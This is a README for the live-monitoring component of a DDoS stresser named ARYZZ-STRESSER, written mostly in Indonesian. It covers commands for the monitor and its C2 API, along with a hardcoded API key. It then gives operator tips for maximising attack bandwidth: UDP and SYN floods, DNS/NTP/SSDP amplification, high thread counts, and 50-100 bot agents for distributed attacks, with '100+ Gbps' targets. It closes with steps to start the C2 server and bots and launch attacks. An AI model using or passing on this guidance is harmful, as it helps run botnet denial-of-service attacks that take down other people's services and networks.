# 🔥 Real-time Attack Monitor Guide

Monitor real-time untuk tracking **Gbps**, **PPS**, dan statistik attack detail.

## 📊 Fitur Monitor

- ✅ **Real-time Gbps** (Gigabits per second)
- ✅ **Real-time PPS** (Packets per second)  
- ✅ **Real-time RPS** (Requests per second)
- ✅ **Total Requests & Packets**
- ✅ **Success/Failed Rate**
- ✅ **Per-Attack Statistics**
- ✅ **Global Statistics**
- ✅ **Auto-refresh Display**

## 🚀 Cara Menggunakan

### Method 1: CLI Monitor (Recommended)

```bash
# Start monitor dengan update interval 2 detik (default)
node monitor.js

# Atau dengan custom interval (dalam milliseconds)
node monitor.js --interval 1000  # Update setiap 1 detik
node monitor.js --interval 5000  # Update setiap 5 detik

# Atau gunakan script helper
chmod +x start-monitor.sh
./start-monitor.sh          # Default 2000ms
./start-monitor.sh 1000     # Custom interval
```

### Method 2: API Endpoint

```bash
# Get current stats via API
curl -H "Authorization: Bearer aryzz-c2-api-key-2024" \
  http://localhost:8080/api/monitor/stats
```

## 📈 Display Format

Monitor akan menampilkan:

```
╔═══════════════════════════════════════════════════════════════════════╗
║           🔥 ARYZZ-STRESSER REAL-TIME MONITOR 🔥                     ║
╚═══════════════════════════════════════════════════════════════════════╝

📊 GLOBAL STATISTICS
───────────────────────────────────────────────────────────────────────
⏱️  Uptime:           5m 30s
🎯 Active Attacks:    3
📈 Total Requests:    125.5M
📦 Total Packets:     89.2M
💾 Total Data:        45.8 GB

⚡ CURRENT RATES
───────────────────────────────────────────────────────────────────────
🔥 Requests/sec:      2.5M RPS
📡 Packets/sec:       20.59M PPS
🌐 Bandwidth:         206.75 Gbps

🎯 ACTIVE ATTACKS
───────────────────────────────────────────────────────────────────────

🔸 Attack ID: a1b2c3d4...
   Method:     HTTP2-ENHANCED
   Target:     https://example.com
   Threads:    1000
   Duration:   2m 15s
   Requests:   45.2M
   Success:    44.8M
   Failed:     400K
   RPS:        850K
   PPS:        7.2M
   Gbps:       85.5
```

## 🎯 Tips untuk Mencapai High Gbps

### 1. Gunakan Layer 4 Methods
Layer 4 lebih efisien untuk high bandwidth:
```bash
# UDP Flood - sangat efektif untuk Gbps tinggi
UDP, TCP, SYN, OVH-UDP

# Amplification attacks - bisa 10x-100x amplification
DNS-AMP, NTP-AMP, SSDP-AMP
```

### 2. Optimize Configuration
```javascript
{
  "threads": 2000,      // Tinggi untuk max throughput
  "rpc": 100,           // Requests per connection
  "duration": 300,      // 5 menit
  "method": "UDP"       // Layer 4 method
}
```

### 3. Deploy Multiple Bots
```bash
# Jalankan 50-100 bot agents untuk distributed attack
# Setiap bot contribute ke total Gbps
```

### 4. Monitor & Optimize
```bash
# Watch monitor untuk lihat method mana yang paling efektif
# Adjust threads/rpc based on hasil real-time
```

## 📊 Understanding Metrics

### Gbps (Gigabits per second)
- Bandwidth yang digunakan
- **Target: 100+ Gbps** untuk high-impact attack
- Layer 4 methods biasanya lebih tinggi

### PPS (Packets per second)  
- Jumlah packets yang dikirim
- **Target: 10M+ PPS** untuk overload network
- Penting untuk DDoS effectiveness

### RPS (Requests per second)
- Jumlah HTTP requests (Layer 7)
- **Target: 1M+ RPS** untuk web application
- Berguna untuk application-layer attacks

## 🔧 Troubleshooting

### Stats Tidak Update
```bash
# Pastikan attack benar-benar running
# Check di C2 server logs

# Restart monitor
Ctrl+C
node monitor.js
```

### Stats Masih 0
```bash
# Pastikan attack methods sudah implement stats tracking
# Check method implementation di src/methods/
```

### Monitor Lag
```bash
# Increase update interval
node monitor.js --interval 5000  # Update lebih jarang
```

## 🎮 Keyboard Shortcuts

- **Ctrl+C** - Stop monitor dan exit
- Monitor auto-refresh sesuai interval

## 📝 Notes

- Monitor hanya track attacks yang **sedang berjalan**
- Stats di-reset saat monitor restart
- Untuk historical data, check database atau logs
- Monitor tidak mempengaruhi performa attack

## 🚀 Next Steps

1. Start C2 server: `node index.js c2-server`
2. Start bot agents: `node index.js c2-agent --c2-url <URL>`
3. Start monitor: `node monitor.js`
4. Launch attack via Telegram bot atau API
5. Watch real-time stats! 🔥

---

**Developer:** Aryzz-Dev (@AryzXploit)  
**Version:** 1.0.0
